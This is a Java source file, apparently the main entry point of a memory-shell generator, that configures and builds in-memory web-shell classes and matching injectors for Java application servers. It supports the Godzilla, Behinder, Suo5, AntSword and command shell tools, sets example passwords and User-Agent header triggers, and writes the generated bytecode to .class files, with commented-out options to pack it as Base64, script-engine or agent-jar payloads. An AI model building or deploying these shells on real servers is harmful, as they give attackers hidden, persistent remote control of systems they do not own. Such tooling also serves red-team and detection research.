package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.generator.*;
import com.reajason.javaweb.memshell.server.AbstractShell;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import net.bytebuddy.jar.asm.Opcodes;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.tuple.Pair;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class GeneratorMain {

    public static void main(String[] args) throws IOException {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Apusic)
                .shellTool(ShellTool.Behinder)
                .shellType(ShellType.LISTENER)
                .targetJreVersion(Opcodes.V1_8)
                .debug(true)
                .build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test123").build();
        CommandConfig commandConfig = CommandConfig.builder().paramName("listener").build();

        BehinderConfig behinderConfig = BehinderConfig.builder()
                .pass("test123")
                .headerName("User-Agent")
                .headerValue("test").build();

        Suo5Config suo5Config = Suo5Config.builder()
                .headerName("User-Agent")
                .headerValue("test").build();

        InjectorConfig injectorConfig = new InjectorConfig();

        GenerateResult generateResult = generate(shellConfig, injectorConfig, behinderConfig);
        if (generateResult != null) {
            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
//            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
//            System.out.println(Packers.ScriptEngine.getInstance().pack(generateResult));
//            Files.write(Path.of("target.jar"), Packer.INSTANCE.AgentJar.getPacker().packBytes(generateResult));
        }
    }

    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        Server server = shellConfig.getServer();
        AbstractShell shell = server.getShell();
        if (shell == null) {
            throw new IllegalArgumentException("Unsupported server");
        }
        if (StringUtils.isBlank(shellToolConfig.getShellClassName())) {
            shellToolConfig.setShellClassName(CommonUtil.generateShellClassName(server, shellConfig.getShellType()));
        }

        if (StringUtils.isBlank(injectorConfig.getInjectorClassName())) {
            injectorConfig.setInjectorClassName(CommonUtil.generateInjectorClassName());
        }

        Pair<Class<?>, Class<?>> shellInjectorPair = shellConfig.getServer().getShell().getShellInjectorPair(shellConfig.getShellTool(), shellConfig.getShellType());
        if (shellInjectorPair == null) {
            throw new UnsupportedOperationException("Unknown shell type: " + shellConfig.getShellType());
        }
        Class<?> shellClass = shellInjectorPair.getLeft();
        Class<?> injectorClass = shellInjectorPair.getRight();

        shellToolConfig.setShellClass(shellClass);

        byte[] shellBytes = generateShellBytes(shellConfig, shellToolConfig);

        injectorConfig = injectorConfig
                .toBuilder()
                .injectorClass(injectorClass)
                .shellClassName(shellToolConfig.getShellClassName())
                .shellClassBytes(shellBytes).build();

        byte[] injectorBytes = new InjectorGenerator(shellConfig, injectorConfig).generate();

        return GenerateResult.builder()
                .shellConfig(shellConfig)
                .shellToolConfig(shellToolConfig)
                .injectorConfig(injectorConfig)
                .shellClassName(shellToolConfig.getShellClassName())
                .shellBytes(shellBytes)
                .injectorClassName(injectorConfig.getInjectorClassName())
                .injectorBytes(injectorBytes)
                .build();
    }

    private static byte[] generateShellBytes(ShellConfig shellConfig, ShellToolConfig shellToolConfig) {
        switch (shellConfig.getShellTool()) {
            case Godzilla:
                return new GodzillaGenerator(shellConfig, (GodzillaConfig) shellToolConfig).getBytes();
            case Command:
                return CommandGenerator.generate(shellConfig, (CommandConfig) shellToolConfig);
            case Behinder:
                return new BehinderGenerator(shellConfig, (BehinderConfig) shellToolConfig).getBytes();
            case Suo5:
                return new Suo5Generator(shellConfig, ((Suo5Config) shellToolConfig)).getBytes();
            case AntSword:
                return new AntSwordGenerator(shellConfig, (AntSwordConfig) shellToolConfig).getBytes();
            default:
                throw new UnsupportedOperationException("Unknown shell tool: " + shellConfig.getShellTool());
        }
    }
}